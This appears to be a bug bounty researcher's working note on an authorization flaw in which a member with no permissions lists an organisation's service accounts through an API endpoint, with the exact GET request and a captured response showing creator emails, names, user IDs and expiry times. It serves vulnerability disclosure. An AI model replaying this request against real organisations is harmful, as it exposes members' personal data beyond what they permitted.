# LEAD — Sibling BFLA: 0-permission member reads creator emails on Service Accounts LIST

## Hypothesis
`GET /api/app/organizations/{org_id}/service-accounts` returns 200 for a member with `permissions: []` and `role: "no role"`, leaking:
- `creator_email` of every other member who ever created an SA
- `creator_name` of same
- Internal `user` and `creator` user IDs (numeric)
- Service-account expiry timestamps (timing intel)

## Evidence (MEMBER, 0 perms, org 3100781)
```
GET /api/app/organizations/3100781/service-accounts
-> 200
{"status":"ok","results":[
  {"id":190105,"username":"service_account_1.4d6b38.mp-service-account","user":6492699,"creator":6492622,"creator_name":"account mix  lastname","creator_email":"bettercallme+m1@wearehackerone.com","created":"2026-05-19T21:37:32Z","last_used":null,"expires":"2026-06-18T21:36:56Z","org_role":"no role"},
  {"id":190477,"username":"pro2_poc.1ef18d.mp-service-account","user":6495909,"creator":6492622,"creator_name":"account mix  lastname","creator_email":"bettercallme+m1@wearehackerone.com","created":"2026-05-23T15:55:09Z","last_used":null,"expires":"2026-05-24T21:55:06Z","org_role":"no role"}
]}
```

## Why filed as a lead
This is technically captured inside the main BFLA finding (`scim-bfla-service-account-create.md` mentions it). Keeping a separate lead because some triage teams will treat read-BFLA as a separable bug class warranting its own report or report bundle. If submitting one report only, fold this into the main finding's "concrete impact" section (already done).
